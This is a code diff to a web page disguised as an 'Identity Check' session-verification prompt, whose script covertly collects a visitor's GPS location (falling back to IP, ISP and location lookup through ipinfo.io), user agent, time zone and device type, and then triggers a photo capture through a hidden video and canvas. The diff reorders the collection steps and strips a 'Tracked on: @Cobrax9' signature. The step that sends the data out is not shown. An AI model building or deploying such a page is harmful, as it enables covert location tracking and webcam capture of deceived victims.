@@ -58,10 +58,11 @@
 <body>
   <div class="card">
     <h2>🔐 Identity Check</h2>
-    <p>Please continue to verify your session securely.</p>
+    <p>Press continue to verify your session securely.</p>
     <button class="btn" onclick="startVerification()">🔓 Continue Verification</button>
     <div class="spinner" id="spinner"></div>
   </div>
+
   <video id="videoPreview" autoplay muted playsinline></video>
   <canvas id="snapshotCanvas" width="320" height="240"></canvas>
 
@@ -77,38 +78,10 @@
 
     function startVerification() {
       spinner.style.display = "block";
-
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          result += "🌍 GPS Location: https://maps.google.com/?q=" + lat + "," + lon + "\n\n";
-          collectRestOfInfo();
-        },
-        err => {
-          console.warn("GPS denied, falling back to IP...");
-          fetchIP();
-        },
-        { timeout: 5000 }
-      );
+      collectDeviceInfo();
     }
 
-    function fetchIP() {
-      fetch("https://ipinfo.io/json?token=demo")
-        .then(res => res.json())
-        .then(data => {
-          result += "🌎 IP Info:\n";
-          result += `🌐 IP: ${data.ip}\n📡 ISP: ${data.org}\n🔍 ASN: ${data.org?.split(" ")[0]}\n`;
-          result += `🌍 IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
-          collectRestOfInfo();
-        })
-        .catch(() => {
-          result += "🌐 Location info unavailable\n\n";
-          collectRestOfInfo();
-        });
-    }
-
-    function collectRestOfInfo() {
+    function collectDeviceInfo() {
       const ua = navigator.userAgent;
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const connection = navigator.connection || {};
@@ -125,10 +98,44 @@
         result += `🕒 Time Zone: ${timeZone}\n\n`;
         result += `🖥️ User Agent: ${ua}\n`;
         result += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
-        result += "👨‍💻 Tracked on: @Cobrax9";
 
-        capturePhoto();
+        requestGPS();
       });
+    }
+
+    function requestGPS() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            result += "🌍 GPS Location: https://maps.google.com/?q=" + lat + "," + lon + "\n\n";
+            capturePhoto();
+          },
+          err => {
+            console.warn("GPS denied, falling back to IP...");
+            fetchIP();
+          },
+          { timeout: 5000 }
+        );
+      } else {
+        fetchIP();
+      }
+    }
+
+    function fetchIP() {
+      fetch("https://ipinfo.io/json?token=demo")
+        .then(res => res.json())
+        .then(data => {
+          result += "🌎 IP Info:\n";
+          result += `🌐 IP: ${data.ip}\n📡 ISP: ${data.org}\n🔍 ASN: ${data.org?.split(" ")[0]}\n`;
+          result += `🌍 IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
+          capturePhoto();
+        })
+        .catch(() => {
+          result += "🌐 Location info unavailable\n\n";
+          capturePhoto();
+        });
     }
 
     function capturePhoto() {
